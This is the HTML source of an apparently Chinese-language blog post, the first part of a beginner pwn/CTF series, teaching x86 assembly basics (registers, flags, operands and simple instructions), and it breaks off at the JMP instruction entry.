@@ -1,0 +1,1173 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Tsuk1">
+  <meta name="keywords" content="Tsuk1">
+  
+    <meta name="description" content="这是2024年10月-11月在培训时所编写的文档，主要内容包括汇编语言、函数调用和栈溢出原理。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwn入门系列（一）">
+<meta property="og:url" content="https://tsuk1ctf.github.io/post/47670.html">
+<meta property="og:site_name" content="Tsuk1">
+<meta property="og:description" content="这是2024年10月-11月在培训时所编写的文档，主要内容包括汇编语言、函数调用和栈溢出原理。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729407589499-a7043269-2d09-4055-a3e9-19f14e1e02e7-1735222654796-155.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729407589581-9bd3884f-fd93-40c9-9c1f-b128b9f3e8ce-1735222654797-156.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729407589643-4ff3aa18-9f1b-4c85-854a-89eb055f7528-1735222654797-157.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729407589709-319cb89a-4336-4d0d-9b38-52fc237732eb-1735222654797-158.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729407589770-93d11168-b99e-4f54-8b27-3e004fbfb31a-1735222654797-159.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729407589862-0fe2b72b-cabf-4b1a-8e64-d77023632cd5-1735222654797-160.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729407589926-dcee0fed-773c-491e-b301-aee4d9265abe-1735222654797-161.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729742376286-84aedbcd-5134-4fb1-9cdf-730607cd8fbc-1735222654797-162.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729742504846-f542b168-5048-4b5d-82b9-68bab938b6a6-1735222654797-163.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729694599728-2e9a39e0-ea9a-4ee2-8320-b11b28f673e6-1735222654797-164.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729694627992-6d9f5b2d-57fe-49e8-80ea-eab44841016d-1735222654797-165.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729415597376-9ecc28cc-bd2b-4b61-b496-3a4ef0f2eb01-1735222654797-166.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729694734686-0ee2abaf-3c57-4427-86e4-95672dad4fe2-1735222654797-167.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729694852185-efb75896-5f88-4f67-9afd-564d99a40397-1735222654797-168.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729693237007-269ca430-7642-41d1-bbd0-c9421f4318f7-1735222654797-169.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729693266402-63709752-4749-401c-967a-d0e6f7dac4ae-1735222654797-170.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729418446953-c66b8407-5364-40b8-8a80-9d2312b4bec1-1735222654797-171.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729693421434-141797d8-5234-4d5d-843b-b4d74a352bd7-1735222654797-172.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729695072591-d002a40f-a791-4ac4-8488-7ec354cbeaa9-1735222654797-173.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729695670527-12e448a1-06a9-4ea8-a976-1d235c86c8d5-1735222654797-174.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729695707477-e316e653-d8ce-4c86-a983-173f419efde0-1735222654797-175.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729695828137-bcf5b41f-0836-4baf-89c6-16db12e603cd-1735222654797-176.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729696069104-9bbf445d-6904-4c9b-9619-97cb189a9447-1735222654797-177.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729696160504-e8a73f85-de9c-4033-9c18-787bbb0dbee4-1735222654797-178.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729696280049-405101de-4a8c-404f-b557-4160fa1ecb79-1735222654797-179.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729696357940-cd504cab-30fc-4019-bef6-6da0bdfe3299-1735222654798-180.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729697167631-257581c7-6a3b-4d5a-a77d-9425dd79676f-1735222654798-181.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/47670/1729697249664-49cf7e81-9dc2-4720-93d6-b643c04c049a-1735222654798-182.png">
+<meta property="article:published_time" content="2024-12-26T14:16:22.000Z">
+<meta property="article:modified_time" content="2025-01-18T12:01:14.354Z">
+<meta property="article:author" content="Tsuk1">
+<meta property="article:tag" content="Tsuk1">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://tsuk1ctf.github.io/post/47670/1729407589499-a7043269-2d09-4055-a3e9-19f14e1e02e7-1735222654796-155.png">
+  
+  
+  
+  <title>Pwn入门系列（一） - Tsuk1</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tsuk1ctf.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tsuk1</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/images/background1.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Pwn入门系列（一）"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-12-26 22:16" pubdate>
+          2024年12月26日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          46 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Pwn入门系列（一）</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h1><p>汇编语言是一种低级编程语言，它与计算机的硬件关系非常密切，通常用于编写运行效率极高的软件。相比高级语言（如 C、Python），汇编语言更接近机器语言（0 和 1），编写时需要手动管理寄存器、内存等硬件资源。</p>
+<h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><p>C语言代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span>&#123;<br>    <span class="hljs-type">int</span> t = x + y;<br>    <span class="hljs-keyword">return</span> t;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>汇编代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sum:<br>    push ebp<br>    mov ebp, esp<br>    mov eax, [ebp+12]<br>    add eax, [ebp+8]<br>    pop ebp<br>    ret<br></code></pre></td></tr></table></figure>
+
+<h2 id="1-什么是汇编语言"><a href="#1-什么是汇编语言" class="headerlink" title="1. 什么是汇编语言"></a>1. 什么是汇编语言</h2><p>汇编语言是介于机器语言和高级语言之间的一种语言。它使用助记符（如 <code>MOV</code>、<code>ADD</code>、<code>JMP</code> 等）来表示机器指令，能够直接控制硬件。每种计算机架构都有自己的汇编语言，例如：</p>
+<ul>
+<li><p><strong>x86 汇编</strong>：用于 Intel 和 AMD 处理器。</p>
+</li>
+<li><p><strong>ARM 汇编</strong>：用于移动设备和嵌入式系统。</p>
+</li>
+</ul>
+<h3 id="汇编语言的特点："><a href="#汇编语言的特点：" class="headerlink" title="汇编语言的特点："></a>汇编语言的特点：</h3><ul>
+<li><p><strong>低级性</strong>：与硬件直接交互，提供对寄存器、内存等资源的直接控制。</p>
+</li>
+<li><p><strong>高效率</strong>：程序执行速度快，适合编写需要极高性能的代码。</p>
+</li>
+<li><p><strong>平台相关性</strong>：不同架构的汇编语言不通用。</p>
+</li>
+</ul>
+<h2 id="2-汇编语言的基本概念"><a href="#2-汇编语言的基本概念" class="headerlink" title="2. 汇编语言的基本概念"></a>2. 汇编语言的基本概念</h2><h3 id="2-1-寄存器"><a href="#2-1-寄存器" class="headerlink" title="2.1 寄存器"></a>2.1 寄存器</h3><p>寄存器是 CPU 内部的高速存储单元，用于存储数据、地址、程序状态等。不同架构的 CPU 具有不同的寄存器集。在 x86 架构中，寄存器的大小经历了从 16 位到 32 位再到 64 位的扩展，现代 x86-64 架构支持 64 位寄存器。</p>
+<p>X86架构是微处理器执行的计算机语言指令集，指一个intel通用计算机系列的标准编号缩写，也标识一套通用的计算机指令集。</p>
+<h4 id="1-16位寄存器"><a href="#1-16位寄存器" class="headerlink" title="1. 16位寄存器"></a>1. 16位寄存器</h4><p>早期的 x86 处理器使用 16 位寄存器，主要用于 8086 和 80286 处理器。常见的 16 位寄存器包括：</p>
+<ul>
+<li><p><strong>AX</strong>：累加器（Accumulator），用于算术运算和数据传输。</p>
+</li>
+<li><p><strong>BX</strong>：基址寄存器（Base Register），常用于存储数据的内存地址。</p>
+</li>
+<li><p><strong>CX</strong>：计数器（Counter），常用于循环和计数操作。</p>
+</li>
+<li><p><strong>DX</strong>：数据寄存器（Data Register），用于 I&#x2F;O 操作和扩展乘法、除法指令。</p>
+</li>
+</ul>
+<p>这四个寄存器还可以拆分为两个 8 位寄存器：</p>
+<ul>
+<li><p><strong>AH</strong> 和 <strong>AL</strong>：AX 的高 8 位和低 8 位。</p>
+</li>
+<li><p><strong>BH</strong> 和 <strong>BL</strong>：BX 的高 8 位和低 8 位。</p>
+</li>
+<li><p><strong>CH</strong> 和 <strong>CL</strong>：CX 的高 8 位和低 8 位。</p>
+</li>
+<li><p><strong>DH</strong> 和 <strong>DL</strong>：DX 的高 8 位和低 8 位。</p>
+</li>
+</ul>
+<p>此外，16 位寄存器还包括：</p>
+<ul>
+<li><p><strong>SP</strong>：堆栈指针（Stack Pointer），指向当前栈顶的位置。</p>
+</li>
+<li><p><strong>BP</strong>：基址指针（Base Pointer），常用于指向栈中的数据。</p>
+</li>
+<li><p><strong>SI</strong>：源索引（Source Index），常用于字符串操作中的源地址。</p>
+</li>
+<li><p><strong>DI</strong>：目标索引（Destination Index），常用于字符串操作中的目标地址。</p>
+</li>
+</ul>
+<h4 id="2-32位寄存器"><a href="#2-32位寄存器" class="headerlink" title="2. 32位寄存器"></a>2. 32位寄存器</h4><p>随着 80386 处理器的推出，寄存器扩展为 32 位。16 位寄存器前面加上了 <code>E</code> 前缀，表示扩展为 32 位。例如：</p>
+<ul>
+<li><p><strong>EAX</strong>：32 位的累加器。</p>
+</li>
+<li><p><strong>EBX</strong>：32 位的基址寄存器。</p>
+</li>
+<li><p><strong>ECX</strong>：32 位的计数器。</p>
+</li>
+<li><p><strong>EDX</strong>：32 位的数据寄存器。</p>
+</li>
+</ul>
+<p>同样，堆栈指针、基址指针和索引寄存器也扩展为 32 位：</p>
+<ul>
+<li><p><strong>ESP</strong>：32 位的栈指针。</p>
+</li>
+<li><p><strong>EBP</strong>：32 位的基址指针。</p>
+</li>
+<li><p><strong>ESI</strong>：32 位的源索引。</p>
+</li>
+<li><p><strong>EDI</strong>：32 位的目标索引。</p>
+</li>
+</ul>
+<h4 id="3-64位寄存器"><a href="#3-64位寄存器" class="headerlink" title="3. 64位寄存器"></a>3. 64位寄存器</h4><p>在 x86-64 架构中，寄存器再次扩展为 64 位，16 个通用寄存器分别以 <code>R</code> 为前缀。常见的 64 位寄存器有：</p>
+<ul>
+<li><p><strong>RAX</strong>：64 位的累加器。</p>
+</li>
+<li><p><strong>RBX</strong>：64 位的基址寄存器。</p>
+</li>
+<li><p><strong>RCX</strong>：64 位的计数器。</p>
+</li>
+<li><p><strong>RDX</strong>：64 位的数据寄存器。</p>
+</li>
+<li><p><strong>RSP</strong>：64 位的栈指针。</p>
+</li>
+<li><p><strong>RBP</strong>：64 位的基址指针。</p>
+</li>
+<li><p><strong>RSI</strong>：64 位的源索引。</p>
+</li>
+<li><p><strong>RDI</strong>：64 位的目标索引。</p>
+</li>
+</ul>
+<p>此外，在 x86-64 中还新增了 8 个通用寄存器：</p>
+<ul>
+<li><strong>R8</strong> 到 <strong>R15</strong>：额外的 64 位通用寄存器。</li>
+</ul>
+<p>这些寄存器也可以访问低 32 位、16 位、甚至 8 位的数据。例如，<code>R8</code> 的低 32 位是 <code>R8D</code>，低 16 位是 <code>R8W</code>，低 8 位是 <code>R8B</code>。</p>
+<h4 id="4-标志寄存器"><a href="#4-标志寄存器" class="headerlink" title="4. 标志寄存器"></a>4. 标志寄存器</h4><p>标志寄存器用于存储算术运算的结果状态，它的每一位代表一个特定的标志。例如：</p>
+<ul>
+<li><p><strong>ZF</strong>（Zero Flag）：如果运算结果为 0，则设置该标志。</p>
+</li>
+<li><p><strong>CF</strong>（Carry Flag）：如果运算产生了进位或借位，则设置该标志。</p>
+</li>
+<li><p><strong>SF</strong>（Sign Flag）：如果运算结果为负数，则设置该标志。</p>
+</li>
+<li><p><strong>OF</strong>（Overflow Flag）：如果有符号运算溢出，则设置该标志。</p>
+</li>
+</ul>
+<h4 id="5-段寄存器"><a href="#5-段寄存器" class="headerlink" title="5. 段寄存器"></a>5. 段寄存器</h4><p>16 位和 32 位汇编中使用段寄存器来描述内存的不同段：</p>
+<ul>
+<li><p><strong>CS</strong>：代码段寄存器（Code Segment），指向正在执行的代码段。</p>
+</li>
+<li><p><strong>DS</strong>：数据段寄存器（Data Segment），指向数据所在的段。</p>
+</li>
+<li><p><strong>SS</strong>：堆栈段寄存器（Stack Segment），指向栈所在的段。</p>
+</li>
+<li><p><strong>ES</strong>、<strong>FS</strong>、<strong>GS</strong>：额外段寄存器，常用于额外的数据段。</p>
+</li>
+</ul>
+<p>在 64 位模式下，段寄存器的使用有所减少，绝大部分程序不再依赖段寄存器。</p>
+<img src="/post/47670/1729407589499-a7043269-2d09-4055-a3e9-19f14e1e02e7-1735222654796-155.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h3 id="2-2-操作数"><a href="#2-2-操作数" class="headerlink" title="2.2 操作数"></a>2.2 操作数</h3><p>汇编语言中的指令通常由操作码（opcode）和操作数（operand）组成。操作数可以是：</p>
+<ul>
+<li><p><strong>立即数</strong>：如 <code>5</code>、<code>0x10</code>，直接表示一个常量。</p>
+</li>
+<li><p><strong>寄存器</strong>：如 <code>AX</code>、<code>BX</code>，表示寄存器中的值。</p>
+</li>
+<li><p><strong>内存地址</strong>：如 <code>[0x1000]</code>，表示某个内存地址中的值。</p>
+</li>
+</ul>
+<h3 id="2-3-指令"><a href="#2-3-指令" class="headerlink" title="2.3 指令"></a>2.3 指令</h3><p>指令是汇编语言的最小执行单元。常见的指令类型包括：</p>
+<ul>
+<li><p><strong>数据传输指令</strong>：如 <code>MOV</code>，用于在寄存器、内存、立即数之间传递数据。</p>
+</li>
+<li><p><strong>算术运算指令</strong>：如 <code>ADD</code>、<code>SUB</code>、<code>MUL</code>，用于执行加法、减法、乘法等运算。</p>
+</li>
+<li><p><strong>逻辑运算指令</strong>：如 <code>AND</code>、<code>OR</code>、<code>XOR</code>，用于执行位运算。</p>
+</li>
+<li><p><strong>控制流指令</strong>：如 <code>JMP</code>、<code>CALL</code>、<code>RET</code>，用于控制程序的执行流程。</p>
+</li>
+</ul>
+<h2 id="3-汇编语言的基本语法"><a href="#3-汇编语言的基本语法" class="headerlink" title="3. 汇编语言的基本语法"></a>3. 汇编语言的基本语法</h2><h3 id="3-1-格式"><a href="#3-1-格式" class="headerlink" title="3.1 格式"></a>3.1 格式</h3><p>汇编语言通常分为以下几部分：</p>
+<ol>
+<li><p><strong>指令助记符</strong>：表示具体的操作，如 <code>MOV</code>、<code>ADD</code> 等。</p>
+</li>
+<li><p><strong>操作数</strong>：指令的操作对象，可以是寄存器、立即数、内存地址等。</p>
+</li>
+<li><p><strong>注释</strong>：以 <code>;</code> 开头，表示对代码的说明，不参与程序执行。</p>
+</li>
+</ol>
+<p>例如，x86 汇编代码的一条指令可能如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">MOV AX, 5    ; 将立即数 5 赋值给寄存器 AX<br></code></pre></td></tr></table></figure>
+
+<h3 id="3-2-基本指令"><a href="#3-2-基本指令" class="headerlink" title="3.2 基本指令"></a>3.2 基本指令</h3><h4 id="3-2-1-数据传输指令"><a href="#3-2-1-数据传输指令" class="headerlink" title="3.2.1 数据传输指令"></a>3.2.1 数据传输指令</h4><h5 id="1-MOV"><a href="#1-MOV" class="headerlink" title="1. MOV"></a>1. MOV</h5><p>数据传送指令</p>
+<p><code>MOV</code> 指令用于将数据从一个地方传送到另一个地方。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">MOV AX, 10        ; 将立即数 10 赋值给 AX 寄存器<br>MOV BX, AX       ; 将 AX 的值复制到 BX<br>MOV [0x1000], AX ; 将 AX 的值存储到内存地址 0x1000<br></code></pre></td></tr></table></figure>
+
+<h5 id="2-XCHG"><a href="#2-XCHG" class="headerlink" title="2. XCHG"></a>2. XCHG</h5><p>交换指令</p>
+<p><code>XCHG</code> 指令用于交换两个操作数的值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">XCHG AX, BX      ; 交换 AX 和 BX 中的值<br></code></pre></td></tr></table></figure>
+
+<h5 id="3-PUSH-POP"><a href="#3-PUSH-POP" class="headerlink" title="3. PUSH &amp;POP"></a>3. PUSH &amp;POP</h5><p>堆栈操作指令</p>
+<p><code>PUSH</code> 和 <code>POP</code> 指令用于将数据压入栈或从栈中弹出。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">PUSH AX          ; 将 AX 的值压入栈<br>POP BX           ; 从栈中弹出值存入 BX<br></code></pre></td></tr></table></figure>
+
+<h4 id="3-2-2-算术运算指令"><a href="#3-2-2-算术运算指令" class="headerlink" title="3.2.2 算术运算指令"></a>3.2.2 算术运算指令</h4><h5 id="1-ADD"><a href="#1-ADD" class="headerlink" title="1. ADD"></a>1. ADD</h5><p>加法指令</p>
+<p><code>ADD</code> 指令用于执行加法运算，并将结果存储在第一个操作数中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">ADD AX, BX       ; 将 AX 和 BX 的值相加，结果存储在 AX 中<br></code></pre></td></tr></table></figure>
+
+<h5 id="2-SUB"><a href="#2-SUB" class="headerlink" title="2. SUB"></a>2. SUB</h5><p>减法指令</p>
+<p><code>SUB</code> 指令用于执行减法运算。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SUB AX, 5        ; 从 AX 中减去 5，结果存储在 AX 中<br></code></pre></td></tr></table></figure>
+
+<h5 id="3-INC-DEC"><a href="#3-INC-DEC" class="headerlink" title="3. INC &amp; DEC"></a>3. INC &amp; DEC</h5><p>自增指令和自减指令</p>
+<ul>
+<li><p><code>INC</code> 指令用于将操作数加 1。</p>
+</li>
+<li><p><code>DEC</code> 指令用于将操作数减 1。</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">INC AX           ; 将 AX 的值加 1<br>DEC BX           ; 将 BX 的值减 1<br></code></pre></td></tr></table></figure>
+
+<h5 id="4-MUL-IMUL"><a href="#4-MUL-IMUL" class="headerlink" title="4. MUL &amp; IMUL"></a>4. MUL &amp; IMUL</h5><p>MUL和IMUL乘法指令</p>
+<ul>
+<li><p><code>MUL</code> 指令用于无符号乘法。</p>
+</li>
+<li><p><code>IMUL</code> 指令用于有符号乘法。</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">MUL BX           ; 无符号乘法，AX = AX * BX<br>IMUL BX          ; 有符号乘法，AX = AX * BX<br></code></pre></td></tr></table></figure>
+
+<h5 id="5-DIV-IDIV"><a href="#5-DIV-IDIV" class="headerlink" title="5. DIV &amp; IDIV"></a>5. DIV &amp; IDIV</h5><p>除法指令</p>
+<ul>
+<li><p><code>DIV</code> 指令用于无符号除法。</p>
+</li>
+<li><p><code>IDIV</code> 指令用于有符号除法。</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">DIV BX           ; 无符号除法，AX = AX / BX<br>IDIV BX          ; 有符号除法，AX = AX / BX<br></code></pre></td></tr></table></figure>
+
+<h4 id="3-2-3-逻辑运算指令"><a href="#3-2-3-逻辑运算指令" class="headerlink" title="3.2.3 逻辑运算指令"></a>3.2.3 逻辑运算指令</h4><h5 id="1-AND"><a href="#1-AND" class="headerlink" title="1. AND"></a>1. AND</h5><p>按位与指令</p>
+<p><code>AND</code> 指令对两个操作数进行按位与运算。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">AND AX, BX       ; AX = AX &amp; BX<br></code></pre></td></tr></table></figure>
+
+<h5 id="2-OR"><a href="#2-OR" class="headerlink" title="2. OR"></a>2. OR</h5><p>按位或指令</p>
+<p><code>OR</code> 指令对两个操作数进行按位或运算。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">OR AX, BX        ; AX = AX | BX<br></code></pre></td></tr></table></figure>
+
+<h5 id="3-XOR"><a href="#3-XOR" class="headerlink" title="3. XOR"></a>3. XOR</h5><p>按位异或指令</p>
+<p><code>XOR</code> 指令对两个操作数进行按位异或运算。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">XOR AX, BX       ; AX = AX ^ BX<br></code></pre></td></tr></table></figure>
+
+<h5 id="4-NOT"><a href="#4-NOT" class="headerlink" title="4. NOT"></a>4. NOT</h5><p>取反指令</p>
+<p><code>NOT</code> 指令对操作数进行按位取反。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">NOT AX           ; AX = ~AX<br></code></pre></td></tr></table></figure>
+
+<h4 id="3-2-4-控制流指令"><a href="#3-2-4-控制流指令" class="headerlink" title="3.2.4 控制流指令"></a>3.2.4 控制流指令</h4><h5 id="1-JMP"><a href="#1-JMP" class="headerlink" title="1. JMP"></a>1. JMP</h5><p>无条件跳转指令</p>
+<p><code>JMP</code> 指令用于无条件跳转到程序中的某个标签位置。</p>
